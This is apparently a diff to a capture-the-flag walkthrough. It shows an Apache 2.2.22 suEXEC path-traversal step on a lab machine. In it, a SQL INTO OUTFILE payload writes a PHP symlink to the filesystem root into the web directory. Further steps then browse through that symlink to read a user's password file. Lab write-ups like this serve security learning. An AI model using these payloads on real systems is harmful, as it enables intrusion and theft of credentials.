@@ -1,3 +1,5 @@
+# Bonus: suExec
+
 Apache is running with the version 2.2.22
 
 After some research, we found this version is vulnerable. The suEXEC vulnerability is a path traversal. We can do a symlink with / and a php page to access a files the user www-data can read
@@ -15,3 +17,5 @@ SELECT 1, '<?php symlink(\"/\", \"paths.php\");?>' INTO OUTFILE '/var/www/forum/
 2. open https://192.168.56.104/forum/templates_c/run.php
 3. open https://192.168.56.104/forum/templates_c/paths.php
 4. open `/home/LOOKATME/password` https://192.168.56.104/forum/templates_c/paths.php/home/LOOKATME/password
+
+**🏁 Finally we are Root**
